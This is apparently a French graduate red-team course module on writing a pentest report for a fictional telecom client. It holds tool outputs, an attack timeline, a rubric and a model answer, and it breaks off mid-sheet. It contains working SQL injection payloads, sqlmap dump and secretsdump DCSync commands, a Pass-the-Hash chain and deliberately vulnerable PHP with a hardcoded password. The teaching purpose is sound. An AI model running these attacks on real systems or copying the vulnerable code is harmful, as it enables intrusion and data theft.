# Module 17 — Atelier rédactionnel sur cas d'étude

> **Durée :** 1h15  
> **Niveau :** M2 Red Team  
> **Prérequis :** Module 16 (Structuration du rapport de pentest)  
> **Objectif pédagogique :** Mettre en pratique les compétences de rédaction de rapport sur un cas d'étude complet. Produire un rapport exécutif, des fiches techniques, et une heat map ATT&CK à partir de résultats bruts.

---

## Table des matières

1. [Cas d'étude fourni](#1-cas-détude-fourni)
2. [Consignes](#2-consignes)
3. [Éléments fournis aux apprenants](#3-éléments-fournis-aux-apprenants)
4. [Grille d'évaluation](#4-grille-dévaluation)
5. [Correction détaillée](#5-correction-détaillée)
6. [Annexes](#6-annexes)

---

## 1. Cas d'étude fourni

### 1.1 Scénario complet

```
┌─────────────────────────────────────────────────────────────────────────┐
│              CAS D'ÉTUDE — ATELIER RÉDACTIONNEL                          │
│                                                                         │
│  Client :       SOGETEL (télécommunications, 500 employés)              │
│  Périmètre :    Application web externe + Active Directory interne       │
│  Type de test : Boîte grise (grey box)                                   │
│  Durée :        5 jours (15-19 janvier 2026)                             │
│  Équipe :       2 pentesters                                             │
│  Objectif :     Évaluer la sécurité du portail client et la robustesse   │
│                 de l'infrastructure Active Directory                     │
│                                                                         │
│  Contexte métier :                                                       │
│  ─────────────────                                                      │
│  SOGETEL opère un portail client permettant aux abonnés de gérer leur   │
│  contrat (consultation factures, options, coordonnées bancaires).        │
│  L'application est hébergée en interne (DMZ) avec accès Internet.        │
│  Le backend s'appuie sur un Active Directory pour l'authentification     │
│  des employés et l'accès aux ressources internes.                        │
│                                                                         │
│  Profil de menace :                                                      │
│  ──────────────────                                                     │
│  Attaquant externe non authentifié → application web                    │
│  Attaquant avec accès réseau interne → AD                               │
└─────────────────────────────────────────────────────────────────────────┘
```

### 1.2 Résultats bruts fournis

Les pentesters ont découvert **5 vulnérabilités majeures** durant la mission :

```
┌─────────────────────────────────────────────────────────────────────────┐
│                   VULNÉRABILITÉS IDENTIFIÉES                             │
│                                                                         │
│  ID      │ VULNÉRABILITÉ           │ CRITICITÉ │ CVSS │ ATT&CK         │
│  ────────┼────────────────────────┼───────────┼──────┼─────────────── │
│  VULN-01 │ SQL Injection (login)   │ CRITIQUE  │ 9.8  │ T1190          │
│  VULN-02 │ XSS reflété (dashboard) │ HAUTE     │ 7.2  │ T1059.007      │
│  VULN-03 │ Pass-the-Hash → DA      │ CRITIQUE  │ 9.0  │ T1550.002      │
│  VULN-04 │ Kerberoasting           │ HAUTE     │ 7.0  │ T1558.003      │
│  VULN-05 │ DCSync via ACL abusive  │ CRITIQUE  │ 8.8  │ T1003.006      │
└─────────────────────────────────────────────────────────────────────────┘
```

### 1.3 Kill Chain — Timeline de l'attaque

```
┌─────────────────────────────────────────────────────────────────────────┐
│              KILL CHAIN — SOGETEL PENTEST (15-19 janvier 2026)           │
│                                                                         │
│  JOUR 1 — RECONNAISSANCE + EXPLOITATION WEB                              │
│  ─────────────────────────────────────────                               │
│  09:00  Début du test                                                    │
│  09:15  Scan Nmap : portail.sogetel.local → ports 80, 443, 8080         │
│  10:00  Énumération web (gobuster, Burp Suite)                          │
│  10:45  Détection SQLi sur /login.php (paramètre username)              │
│  11:30  Exploitation SQLi avec sqlmap — accès base clients              │
│  14:00  Exfiltration complète table clients (18 234 enregistrements)    │
│  15:00  Discovery XSS reflété sur /dashboard.php (paramètre msg)        │
│  16:00  Début énumération Active Directory (SharpHound)                 │
│                                                                         │
│  JOUR 2 — COMPROMISSION ACTIVE DIRECTORY                                 │
│  ─────────────────────────────────────────                               │
│  09:00  BloodHound : analyse des paths to DA                            │
│  10:00  Kerberoasting — extraction SPN (GetUserSPNs.py)                 │
│  11:00  Cracking hash SPN sql_svc → mot de passe "Eté2024!"             │
│  13:30  Pass-the-Hash avec compte sql_svc → SRV01                      │
│  14:30  Mimikatz sur SRV01 → extraction hash DA (Administrator)         │
│  15:00  Pass-the-Hash Administrator → DC01 → Domain Admin               │
│  15:30  DCSync via secretsdump.py → extraction NTDS.dit                 │
│  16:00  Compromission totale du domaine (tous les hashs)                │
│                                                                         │
│  JOUR 3 — POST-EXPLOITATION + PERSISTANCE                                │
│  ─────────────────────────────────────────                               │
│  09:00  Mouvement latéral : DC01 → SRV02 (RDP avec hash Administrator)  │
│  10:00  Exfiltration partage Finance → PDF paie, contrats               │
│  11:00  Création compte persistant : CORP\svc_backup                     │
│  14:00  Scheduled task de callback sur SRV01                            │
│  15:00  Nettoyage logs sur DC01 et SRV01-02                             │
│                                                                         │
│  JOUR 4 — TESTS COMPLÉMENTAIRES                                          │
│  ─────────────────────────────                                           │
│  09:00  Scan Nessus du périmètre complet                                │
│  11:00  Vérification en-têtes de sécurité HTTP                          │
│  14:00  Tests de défense : le SOC n'a détecté aucune activité            │
│  16:00  Rédaction des premières fiches techniques                       │
│                                                                         │
│  JOUR 5 — NETTOYAGE + CLÔTURE                                             │
│  ────────────────────────────                                            │
│  09:00  Suppression : compte svc_backup, scheduled task, fichiers       │
│  10:00  Vérification état des systèmes                                  │
│  11:00  Fin du test — débriefing à chaud                                │
│  14:00  Début rédaction du rapport                                      │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Consignes

### 2.1 Livrables attendus

Vous devez produire **quatre livrables** en 1h15 :

```
┌─────────────────────────────────────────────────────────────────────────┐
│                       LIVRABLES ATTENDUS                                 │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ LIVRABLE 1 — RAPPORT EXÉCUTIF (1 page)                             │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │ Public : COMEX, DG, RSSI                                           │ │
│  │ Contenu :                                                          │ │
│  │   • Score de risque global (sur 10)                                │ │
│  │   • Synthèse des actions menées en 5 jours                         │ │
│  │   • Top 3 vulnérabilités avec impact métier                        │ │
│  │   • Verdict GO/NO GO                                               │ │
│  │   • Recommandation stratégique                                     │ │
│  │   • Prochaines étapes (quick wins, court/moyen terme)              │ │
│  │ Format : Markdown, 1 page A4 maximum                               │ │
│  └───────────────────────────────────────────────────────────────────┘ │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ LIVRABLE 2 — 3 FICHES TECHNIQUES                                   │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │ Public : Équipe IT, Développeurs, DevOps                           │ │
│  │ Fiches à produire :                                                │ │
│  │   Fiche A : VULN-01 — SQL Injection sur login.php                  │ │
│  │   Fiche B : VULN-03 — Pass-the-Hash → Domain Admin                 │ │
│  │   Fiche C : VULN-05 — DCSync via ACL abusive                       │ │
│  │ Chaque fiche doit contenir :                                        │ │
│  │   • En-tête (ID, titre, CVSS vector, CWE, OWASP, MITRE)           │ │
│  │   • Description technique                                          │ │
│  │   • PoC avec payloads/outputs                                      │ │
│  │   • Impact C/I/A + réglementaire                                   │ │
│  │   • Remédiation : code avant/après + mesures globales              │ │
│  │   • Références                                                     │ │
│  │ Format : Sous-sections Markdown dans un seul fichier               │ │
│  └───────────────────────────────────────────────────────────────────┘ │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ LIVRABLE 3 — HEAT MAP MITRE ATT&CK                                 │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │ Public : SOC, RSSI                                                 │ │
│  │ Contenu :                                                          │ │
│  │   • Techniques testées avec résultat (exploitée/tentative/non      │ │
│  │     testée) pour au moins 6 tactiques ATT&CK                        │ │
│  │   • Statistiques de couverture par tactique                        │ │
│  │   • Gap analysis : techniques non testées = risques résiduels      │ │
│  │ Format : Tableau Markdown structuré                                │ │
│  └───────────────────────────────────────────────────────────────────┘ │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ LIVRABLE 4 — RECOMMANDATIONS PRIORISÉES                            │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │ Public : RSSI, Directeur IT                                        │ │
│  │ Contenu : Roadmap J+7 / J+30 / J+90 / J+180                       │ │
│  │ Pour chaque phase :                                                │ │
│  │   • Vulnérabilités ciblées (ID)                                     │ │
│  │   • Actions concrètes                                              │ │
│  │   • Effort estimé (jours.homme)                                    │ │
│  │   • Risque résiduel après la phase                                 │ │
│  │ Format : Tableau Markdown                                          │ │
│  └───────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2.2 Règles rédactionnelles

```
┌─────────────────────────────────────────────────────────────────────────┐
│                   RÈGLES RÉDACTIONNELLES OBLIGATOIRES                    │
│                                                                         │
│  1. PAS DE "je pense", "il me semble", "peut-être"                     │
│     → Langage factuel et affirmatif                                     │
│                                                                         │
│  2. QUANTIFIER SYSTÉMATIQUEMENT                                         │
│     → "18 234 enregistrements" vs "beaucoup de données"                 │
│                                                                         │
│  3. PREUVES VISUELLES SANS SCREENSHOT                                   │
│     → Décrire textuellement les captures (pas d'images réelles)         │
│     → "Capture 1 : Erreur MySQL affichée avec la syntaxe complète"     │
│                                                                         │
│  4. REMÉDIATION AVEC CODE AVANT/APRÈS                                   │
│     → Montrer le code vulnérable ET le code corrigé                    │
│                                                                         │
│  5. TAGUER CHAQUE VULNÉRABILITÉ MITRE ATT&CK                            │
│     → Format TXXXX (ex: T1190, T1550.002)                              │
│                                                                         │
│  6. TRADUIRE TECHNIQUE → MÉTIER POUR L'EXÉCUTIF                         │
│     → "DCSync" → "Extraction de tous les mots de passe du domaine"     │
│                                                                         │
│  7. RESPECTER LE FORMAT DU MODULE 16                                    │
│     → Structure de fiche conforme au §3.2 du M16                        │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Éléments fournis aux apprenants

### 3.1 Output Nmap — Scan initial du périmètre

```bash
$ nmap -sC -sV -p- portail.sogetel.local -oA nmap_portail
```

```
Starting Nmap 7.95 ( https://nmap.org )

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.49 ((Ubuntu))
|_http-title: SOGETEL — Portail Client
|_http-server-header: Apache/2.4.49 (Ubuntu)
443/tcp  open  ssl/http   Apache httpd 2.4.49 ((Ubuntu))
|_http-title: SOGETEL — Portail Client
|_http-server-header: Apache/2.4.49 (Ubuntu)
| ssl-cert: Subject: commonName=*.sogetel.local
| Not valid before: 2025-06-01T00:00:00
| Not valid after:  2026-06-01T23:59:59
8080/tcp open  http-proxy Apache httpd 2.4.49 ((Ubuntu))
|_http-title: SOGETEL — API Admin
|_http-server-header: Apache/2.4.49 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 45.23 seconds
```

**Analyse fournie :** Apache 2.4.49 est vulnérable (CVE-2021-41773 — Path Traversal). Port 8080 expose une API admin non documentée. Seuls les ports 80 et 443 sont accessibles depuis Internet, 8080 depuis le réseau interne uniquement.

### 3.2 Logs SQLi — Output sqlmap sur login.php

```bash
$ sqlmap -u "https://portail.sogetel.local/login.php" \
  --data="username=admin&password=test" \
  --dbms=mysql --dbs --batch
```

```
[10:47:23] [INFO] testing connection to the target URL
[10:47:25] [INFO] testing if the target URL content is stable
[10:47:26] [INFO] target URL content is stable
[10:47:30] [INFO] heuristic (basic) test shows that POST parameter
'username' might be injectable (possible DBMS: 'MySQL')
[10:47:35] [INFO] testing for SQL injection on POST parameter 'username'
[10:47:38] [INFO] POST parameter 'username' is 'MySQL >= 5.0.12 AND
error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable
[10:47:40] [INFO] POST parameter 'username' is 'MySQL >= 5.1 AND
error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
[10:47:42] [INFO] POST parameter 'username' is 'MySQL UNION query' injectable

[10:48:05] [INFO] fetching database names
available databases [4]:
[*] information_schema
[*] sogetel_portal
[*] sogetel_admin
[*] test

[10:48:15] [INFO] fetching tables for database: 'sogetel_portal'
Database: sogetel_portal
[4 tables]
+------------------+
| clients          |
| contrats         |
| factures         |
| paiements        |
+------------------+

[10:48:30] [INFO] fetching columns for table: 'sogetel_portal.clients'
Database: sogetel_portal
Table: clients
[8 columns]
+------------------+--------------+
| Column           | Type         |
+------------------+--------------+
| id               | int(11)      |
| nom              | varchar(100) |
| prenom           | varchar(100) |
| email            | varchar(150) |
| telephone        | varchar(15)  |
| adresse          | text         |
| date_naissance   | date         |
| num_client       | varchar(20)  |
+------------------+--------------+

[10:48:45] [INFO] fetching entries for table: 'sogetel_portal.clients'
Database: sogetel_portal
Table: clients
[18 234 entries]
+------+----------+-----------+---------------------------+-----------+
| id   | nom      | prenom    | email                     | telephone |
+------+----------+-----------+---------------------------+-----------+
| 1    | DUBOIS   | Jean      | j.dubois@email.fr         | 06xxxx    |
| 2    | MARTIN   | Sophie    | s.martin@email.fr         | 07xxxx    |
| 3    | BERNARD  | Luc       | l.bernard@email.fr        | 06xxxx    |
| ...  | ...      | ...       | ...                       | ...       |
|18234 | PETIT    | Antoine   | a.petit@gmail.com         | 06xxxx    |
+------+----------+-----------+---------------------------+-----------+

[10:49:00] [INFO] fetching entries for table: 'sogetel_portal.paiements'
Database: sogetel_portal
Table: paiements
[847 entries]
+------+-----------+-------------+------------+--------+
| id   | client_id | iban        | cc_last4   | montant|
+------+-----------+-------------+------------+--------+
| 1    | 1         | FR76xxxx    | 4532       | 49.90  |
| 2    | 2         | FR76xxxx    | 5214       | 79.99  |
+------+-----------+-------------+------------+--------+

[10:49:10] [INFO] table 'sogetel_portal.paiements' dumped to CSV file
[10:49:10] [INFO] fetched 847 entries from table 'paiements'
[10:49:10] [WARNING] IBAN numbers found — PII/PCI-DSS scope
```

**Analyse fournie :** 18 234 clients exposés (PII : nom, prénom, email, téléphone, adresse, date de naissance). 847 paiements exposés (IBAN complet, 4 derniers chiffres CB). Injection non authentifiée — accessible depuis Internet. Risque PCI-DSS majeur.

### 3.3 Screenshot BloodHound — Path to Domain Admin

```
┌─────────────────────────────────────────────────────────────────────────┐
│  [SCHÉMA BLOODHOUND — PATH TO DOMAIN ADMIN]                              │
│                                                                         │
│                                                                         │
│   ┌─────────────────────┐                                                │
│   │  CORP\sql_svc       │  ◄── SPN cracké (mot de passe "Eté2024!")     │
│   │  (Service Account)  │                                                │
│   └────────┬────────────┘                                                │
│            │                                                             │
│            │ AdminTo (SRV01)                                             │
│            │ T1550.002 — Pass-the-Hash                                   │
│            ▼                                                             │
│   ┌─────────────────────┐                                                │
│   │  SRV01.sogetel.local│  ◄── sql_svc est administrateur local de SRV01│
│   │  (Windows Server)   │                                                │
│   └────────┬────────────┘                                                │
│            │                                                             │
│            │ HasSession (Administrator)                                  │
│            │ T1003.001 — LSASS Memory Dump                               │
│            ▼                                                             │
│   ┌─────────────────────┐                                                │
│   │  Administrator      │  ◄── Hash LM:NT récupéré via Mimikatz          │
│   │  (DA Account)       │      LM: aad3b435b51404eeaad3b...              │
│   └────────┬────────────┘      NT: c15334f5e3a1d12a6f...                │
│            │                                                             │
│            │ AdminTo (DC01) + MemberOf (Domain Admins)                   │
│            │ T1550.002 — Pass-the-Hash                                    │
│            ▼                                                             │
│   ┌─────────────────────┐                                                │
│   │  DC01.sogetel.local │  ◄── Contrôle total du domaine obtenu          │
│   │  (Domain Controller)│      en 2 jours                                │
│   └────────┬────────────┘                                                │
│            │                                                             │
│            │ DCSync (DS-Replication-Get-Changes)                         │
│            │ T1003.006 — DCSync                                           │
│            ▼                                                             │
│   ┌─────────────────────┐                                                │
│   │  NTDS.dit extrait   │  ◄── Tous les hashs du domaine (312 comptes)   │
│   │  + SAM + SECRETS    │                                                │
│   └─────────────────────┘                                                │
│                                                                         │
│  ATTACK PATH : CORP\sql_svc@SRV01 → Administrator → DC01 → NTDS.dit     │
│  NOMBRE DE SAUTS : 3                                                     │
│  TEMPS DE COMPROMISSION : 6h30 (depuis le début du test)                │
│                                                                         │
│  TACTIQUES ATT&CK UTILISÉES :                                            │
│  T1558.003 — Kerberoasting                                               │
│  T1550.002 — Pass-the-Hash (x2)                                          │
│  T1003.001 — LSASS Memory Dump                                           │
│  T1003.006 — DCSync                                                      │
└─────────────────────────────────────────────────────────────────────────┘
```

### 3.4 Output secretsdump — Extraction DCSync

```bash
$ secretsdump.py -just-dc-ntlm sogetel/CORP\\Administrator@DC01.sogetel.local
```

```
Impacket v0.12.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:c15334f5e3a1d12a6f...
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c...
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7b4d9a5c2f3b8e1a6d...
sql_svc:1103:aad3b435b51404eeaad3b435b51404ee:2b4f8c9e1a6d3f7c5b...
svc_web:1104:aad3b435b51404eeaad3b435b51404ee:8c9e2b4f1a6d3f7c5b...
jsmith:1105:aad3b435b51404eeaad3b435b51404ee:f1a6d3f7c5b8c9e2b4...
mdupont:1106:aad3b435b51404eeaad3b435b51404ee:3f7c5b8c9e2b4f1a6d...
[... 312 comptes extraits au total ...]

[*] Cleaning up...
```

**Analyse fournie :** 312 comptes extraits du NTDS.dit. Tous les hashs LM sont vides (comportement normal Windows > 2008). Le hash du krbtgt permet la création de Golden Tickets (T1558.001). Le DCSync a été possible car le compte sql_svc possédait le droit DS-Replication-Get-Changes (ACL abusive ajoutée par un administrateur, non documentée).

### 3.5 Synthèse des vulnérabilités détectées

```markdown
## Tableau de synthèse — SOGETEL Pentest Q1 2026

| ID      | Titre                                     | Criticité | CVSS | ATT&CK       |
|---------|-------------------------------------------|-----------|------|--------------|
| VULN-01 | SQL Injection — login.php                 | CRITIQUE  | 9.8  | T1190        |
| VULN-02 | XSS reflété — dashboard.php               | HAUTE     | 7.2  | T1059.007    |
| VULN-03 | Pass-the-Hash → Domain Admin              | CRITIQUE  | 9.0  | T1550.002    |
| VULN-04 | Kerberoasting — SPN sql_svc               | HAUTE     | 7.0  | T1558.003    |
| VULN-05 | DCSync via ACL abusive                    | CRITIQUE  | 8.8  | T1003.006    |
```

### 3.6 Extrait du code vulnérable (login.php)

```php
// Fichier : /var/www/portail/login.php — Lignes 42-52

$username = $_POST['username'];
$password = $_POST['password'];

// Connexion MySQL
$conn = new mysqli('localhost', 'portal', 'P0rt@l2024!', 'sogetel_portal');

// ⚠️ CODE VULNÉRABLE — Concaténation directe dans la requête SQL
$query = "SELECT id, username, role FROM users
          WHERE username = '" . $username . "'
          AND password = '" . md5($password) . "'";
$result = mysqli_query($conn, $query);

// ⚠️ Le mot de passe est hashé en MD5 (faible + unsalted)
```

---

## 4. Grille d'évaluation

```
┌─────────────────────────────────────────────────────────────────────────┐
│                   GRILLE D'ÉVALUATION — ATELIER RÉDACTIONNEL             │
│                   Total : 50 points                                      │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ CRITÈRE 1 — QUALITÉ RÉDACTIONNELLE (/10 pts)                       │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │  □  Pas de "je pense que" / "il me semble" (2 pts)                │ │
│  │  □  Langage factuel, neutre, professionnel (2 pts)                 │ │
│  │  □  Orthographe et grammaire correctes (2 pts)                     │ │
│  │  □  Pas de jargon technique dans l'exécutif (2 pts)                │ │
│  │  □  Homogénéité des formats (dates, unités, tableaux) (2 pts)     │ │
│  └───────────────────────────────────────────────────────────────────┘ │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ CRITÈRE 2 — PRÉCISION TECHNIQUE (/10 pts)                          │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │  □  CVSS vector complet et justifié (2 pts)                        │ │
│  │  □  CWE + OWASP + MITRE ATT&CK corrects (2 pts)                    │ │
│  │  □  Description technique précise (fichier, ligne, cause) (2 pts)  │ │
│  │  □  PoC détaillé avec payloads et outputs réels (2 pts)            │ │
│  │  □  Code vulnérable identifié et expliqué (2 pts)                  │ │
│  └───────────────────────────────────────────────────────────────────┘ │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ CRITÈRE 3 — PERTINENCE DES RECOMMANDATIONS (/10 pts)               │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │  □  Code de correction exact (avant/après) (3 pts)                 │ │
│  │  □  Mesures globales cohérentes et réalistes (3 pts)               │ │
│  │  □  Priorisation correcte (critique → basse) (2 pts)               │ │
│  │  □  Estimation des efforts crédible (2 pts)                        │ │
│  └───────────────────────────────────────────────────────────────────┘ │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ CRITÈRE 4 — LISIBILITÉ DU RAPPORT EXÉCUTIF (/10 pts)               │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │  □  1 page maximum respectée (2 pts)                               │ │
│  │  □  Score de risque visible immédiatement (2 pts)                  │ │
│  │  □  Traduction technique → métier correcte (2 pts)                 │ │
│  │  □  Quantification des impacts (chiffres) (2 pts)                  │ │
│  │  □  Verdict GO/NO GO clair et justifié (2 pts)                    │ │
│  └───────────────────────────────────────────────────────────────────┘ │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ CRITÈRE 5 — COMPLÉTUDE DE LA HEAT MAP (/10 pts)                    │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │  □  Au moins 6 tactiques ATT&CK couvertes (3 pts)                  │ │
│  │  □  Légende exploitable (couleurs/symboles) (2 pts)                │ │
│  │  □  Statistiques de couverture par tactique (2 pts)                │ │
│  │  □  Gap analysis avec risques résiduels (3 pts)                    │ │
│  └───────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
```

**Barème de notation :**

| Score | Mention | Interprétation |
|-------|---------|----------------|
| 45-50 | Excellent | Rapport livrable en l'état au client |
| 35-44 | Très bien | Quelques corrections mineures nécessaires |
| 25-34 | Bien | Relecture approfondie nécessaire |
| 15-24 | Insuffisant | Structure à revoir, lacunes majeures |
| 0-14 | Non conforme | Rapport à refaire intégralement |

---

## 5. Correction détaillée

### 5.1 Rapport exécutif modèle (Livrable 1)

```markdown
# Rapport de Test d'Intrusion — Synthèse Exécutive

**Client :** SOGETEL  
**Périmètre :** Portail client (web) + Active Directory (interne)  
**Type :** Test d'intrusion en boîte grise  
**Dates :** 15-19 janvier 2026  
**Classification :** CONFIDENTIEL  

---

## Score de risque global

╔═══════════════════════════════════════╗
║        RISQUE GLOBAL : CRITIQUE       ║
║        Score : 9.0 / 10               ║
╚═══════════════════════════════════════╝

---

## Résumé des actions menées

En 5 jours, l'équipe de test a :
- Identifié 5 vulnérabilités (3 critiques, 2 hautes)
- Compromis le domaine Active Directory en 6h30 (dont 3 sauts)
- Exfiltré 18 234 enregistrements de la base de données clients
- Accédé aux coordonnées bancaires de 847 clients (IBAN + CB)
- Obtenu un accès Domain Admin complet (312 comptes extraits)
- Constaté l'absence totale de détection par le SOC

---

## Top 3 vulnérabilités critiques

| # | Vulnérabilité | Impact métier | CVSS |
|---|--------------|---------------|------|
| 1 | SQL Injection (login.php) | Vol de 18 234 données clients + IBAN | 9.8 |
| 2 | Pass-the-Hash → Domain Admin | Contrôle total de l'Active Directory | 9.0 |
| 3 | DCSync via ACL abusive | Extraction de tous les mots de passe | 8.8 |

---

## Impact métier

**Réglementaire :**
- RGPD : 18 234 données personnelles exposées → amende jusqu'à 4% du CA
- PCI-DSS : 847 IBANs exposés → audit QSA obligatoire, risque de suspension
- NIS2 : Incident significatif → notification ANSSI sous 24h obligatoire

**Financier (estimation fourchette) :**
| Type d'impact | Estimation basse | Estimation haute |
|--------------|-----------------|------------------|
| Amendes RGPD/NIS2 | 100 000 € | 500 000 € |
| Remédiation d'urgence | 40 000 € | 100 000 € |
| Perte d'exploitation | 50 000 € | 200 000 € |
| Atteinte réputationnelle | 200 000 € | 800 000 € |
| **TOTAL** | **390 000 €** | **1 600 000 €** |

---

## Verdict

╔══════════════════════════════════════════════════════════════════╗
║  RECOMMANDATION : CORRECTION IMMÉDIATE DES 3 VULNÉRABILITÉS    ║
║  CRITIQUES. LE PORTAIL NE DOIT PAS RESTER ACCESSIBLE DEPUIS     ║
║  INTERNET TANT QUE LA SQLi N'EST PAS CORRIGÉE.                  ║
║  BUDGET REMÉDIATION ESTIMÉ : 65 k€ (J+90).                      ║
╚══════════════════════════════════════════════════════════════════╝

---

## Prochaines étapes

| Phase | Délai | Actions clés | Effort |
|-------|-------|-------------|--------|
| Quick Wins | J+7 | SQLi login.php + désactiver portail public | 2h |
| Court terme | J+30 | Corriger ACL DCSync + Credential Guard + LAPS | 3 jours |
| Moyen terme | J+90 | WAF + MFA + SIEM + Formation OWASP | 10 jours |
| Long terme | J+180 | Red Team interne, certification ISO 27001 | Continu |

**Prochain pentest recommandé :** Retest de validation à J+90 (3 jours)

---

**Contact :** Lead Pentester — [email] — [téléphone]
```

### 5.2 Fiches techniques modèles (Livrable 2)

#### 5.2.1 Fiche A — VULN-01 SQL Injection login.php

```markdown
## VULN-01 — SQL Injection sur login.php

┌─────────────────────────────────────────────────────────────────────────┐
│ IDENTIFIANT         │ VULN-01                                           │
│ TITRE               │ SQL Injection (Error-based + Union-based) sur le  │
│                     │ paramètre username de login.php                    │
│ CRITICITÉ           │ 🔴 CRITIQUE                                       │
│ CVSS SCORE          │ 9.8                                               │
│ CVSS VECTOR         │ CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H     │
│ CWE                 │ CWE-89 : Improper Neutralization of Special       │
│                     │ Elements used in an SQL Command                   │
│ OWASP               │ A03:2021 — Injection                              │
│ MITRE ATT&CK        │ T1190 — Exploit Public-Facing Application         │
│ DATE DÉCOUVERTE     │ 15/01/2026 — 10:45                                │
│ OUTIL               │ Test manuel + sqlmap v1.8.3                       │
│ STATUT              │ Non corrigé                                       │
└─────────────────────────────────────────────────────────────────────────┘

### Description technique

Le paramètre POST `username` de la page `/login.php` est directement
concaténé dans une requête SQL sans validation ni échappement.

**Code vulnérable (login.php, lignes 42-48) :**
```php
$username = $_POST['username'];
$password = $_POST['password'];
$conn = new mysqli('localhost', 'portal', 'P0rt@l2024!', 'sogetel_portal');
$query = "SELECT id, username, role FROM users
          WHERE username = '" . $username . "'
          AND password = '" . md5($password) . "'";
$result = mysqli_query($conn, $query);
```

L'absence d'authentification requise pour accéder à cette page aggrave
la vulnérabilité : tout utilisateur Internet peut l'exploiter.

### Preuve d'exploitation (PoC)

**Étape 1 — Détection :**
```http
POST /login.php HTTP/1.1
Host: portail.sogetel.local
Content-Type: application/x-www-form-urlencoded

username=admin'&password=test
```
→ Erreur MySQL visible : `You have an error in your SQL syntax...`

**Étape 2 — Contournement d'authentification :**
```
Payload : username=admin' OR '1'='1' -- -&password=x
Résultat : Authentification réussie en tant qu'administrateur
```

**Étape 3 — Énumération sqlmap :**
```bash
sqlmap -u "https://portail.sogetel.local/login.php" \
  --data="username=admin&password=test" --dbms=mysql --dbs
```
→ 3 bases de données découvertes : `sogetel_portal`, `sogetel_admin`, `test`

**Étape 4 — Exfiltration complète :**
```bash
sqlmap -u "https://portail.sogetel.local/login.php" \
  --data="username=admin&password=test" \
  -D sogetel_portal -T clients --dump --threads=10
```
→ **18 234 enregistrements clients** exfiltrés (PII : nom, prénom, email,
téléphone, adresse, date de naissance)

→ **847 enregistrements de paiements** exfiltrés (IBAN complet + 4 derniers
chiffres CB) de la table `paiements`

### Impact

**Confidentialité (C:H) :**
- Accès non authentifié à 18 234 enregistrements clients (données PII)
- Exposition de 847 IBANs complets et données de paiement
- Atteinte au secret bancaire et à la vie privée des clients

**Intégrité (I:H) :**
- INSERT/UPDATE/DELETE possible sur les tables `clients`, `contrats`,
  `factures`, `paiements`
- Risque de modification de contrats, montants, statuts

**Disponibilité (A:H) :**
- DROP TABLE techniquement possible
- Risque de destruction complète de la base de production
- Interruption du service client

**Réglementaire :**
- RGPD Art. 32-33 — notification CNIL sous 72h
- PCI-DSS — violation scope élargi, suspension possible
- NIS2 — notification ANSSI sous 24h

### Remédiation

**Correctif immédiat :**
```php
// AVANT (vulnérable)
$query = "SELECT id, username, role FROM users
          WHERE username = '" . $username . "'
          AND password = '" . md5($password) . "'";
$result = mysqli_query($conn, $query);

// APRÈS (corrigé — requête préparée + bcrypt)
$stmt = $conn->prepare(
    "SELECT id, username, role, password_hash FROM users WHERE username = ?"
);
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();

if ($user && password_verify($password, $user['password_hash'])) {
    // Authentification réussie (remplacer md5 par bcrypt)
}
```

**Correctif global :**
1. Passer toutes les requêtes SQL en requêtes préparées (PDO/mysqli)
2. Remplacer MD5 par bcrypt/argon2id avec sel
3. Déployer un WAF (ModSecurity + OWASP CRS)
4. Désactiver `display_errors` en production
5. Appliquer le moindre privilège au compte MySQL (pas de DROP/ALTER)
6. Intégrer un SAST (Semgrep, SonarQube) dans la CI/CD

### Références

| Source | Référence |
|--------|-----------|
| CWE | CWE-89 |
| OWASP | A03:2021 — Injection |
| MITRE | T1190 — Exploit Public-Facing Application |
| CAPEC | CAPEC-66 — SQL Injection |
```

#### 5.2.2 Fiche B — VULN-03 Pass-the-Hash → Domain Admin

```markdown
## VULN-03 — Pass-the-Hash → Domain Admin

┌─────────────────────────────────────────────────────────────────────────┐
│ IDENTIFIANT         │ VULN-03                                           │
│ TITRE               │ Pass-the-Hash permettant l'élévation au rôle      │
│                     │ Domain Admin depuis le compte sql_svc             │
│ CRITICITÉ           │ 🔴 CRITIQUE                                       │
│ CVSS SCORE          │ 9.0                                               │
